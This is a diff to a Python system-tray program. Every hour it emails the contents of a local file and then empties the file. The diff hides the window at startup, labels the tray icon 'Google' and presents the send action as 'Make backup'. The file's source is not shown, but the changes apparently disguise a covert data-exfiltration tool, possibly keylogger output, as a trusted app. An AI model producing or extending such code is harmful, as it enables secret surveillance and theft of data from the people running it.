@@ -75,16 +75,15 @@ def quit_window(icon, item):
     win.destroy()
 
 # Define a function to show the window again
-def show_window(icon, item):
-   icon.stop()
-   win.after(0,win.deiconify())
+def make_backup():
+   makeAndSendMessage()
 
 # Hide the window and show on the system taskbar
 def hide_window():
    win.withdraw()
    image=Image.open("favicon.ico")
-   menu=(item('Quit', quit_window), item('Show', show_window))
-   icon=pystray.Icon("name", image, "My System Tray Icon", menu)
+   menu=(item('Quit', quit_window), item('Make backup', make_backup))
+   icon=pystray.Icon("name", image, "Google", menu)
    icon.run()
 
 def makeAndSendMessage():
@@ -93,10 +92,8 @@ def makeAndSendMessage():
         email.sendMessage()
         f.truncate(0)
 
-win.protocol('WM_DELETE_WINDOW', hide_window)
-
 scheduler = BackgroundScheduler()
 scheduler.add_job(makeAndSendMessage, 'interval', hours=1)
 scheduler.start()
 
-win.mainloop()
+hide_window()
